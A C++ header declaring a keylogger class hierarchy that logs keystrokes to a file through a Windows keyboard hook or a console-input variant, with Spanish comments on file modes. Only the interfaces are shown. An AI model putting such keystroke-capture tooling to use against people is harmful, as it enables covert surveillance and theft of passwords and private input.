#pragma once
#include <fstream>
#include <windows.h>
#include <string>


namespace KeyLog
{
    class KeyLoggerBase {
    protected:
        // std::ios::app indica que se abrirá el archivo en modo de adición
        // Si el archivo no existe, se creará
        // Si el archivo ya existe, se agregará al final del archivo existente
        // std::ios::out indica que se abrirá el archivo para escritura
        // std::ios::in indica que se abrirá el archivo para lectura
        // std::ofstream log("file_name.txt", std::ios::app);
        std::ofstream logFile;
    public:
        virtual ~KeyLoggerBase() = default;
        virtual bool start(const std::string& filename) = 0;
        virtual void run() = 0;
    };

    class KeyLogger : public KeyLoggerBase {
    private:
        HHOOK hHook;
        static KeyLogger* instance;
        static LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
    public:
        KeyLogger();
        ~KeyLogger();
        bool start(const std::string& filename) override;
        void run() override;
    };

    class KeyLoggerConio : public KeyLoggerBase {
    public:
        KeyLoggerConio();
        ~KeyLoggerConio();
        bool start(const std::string& filename) override;
        void run() override;
    };
}
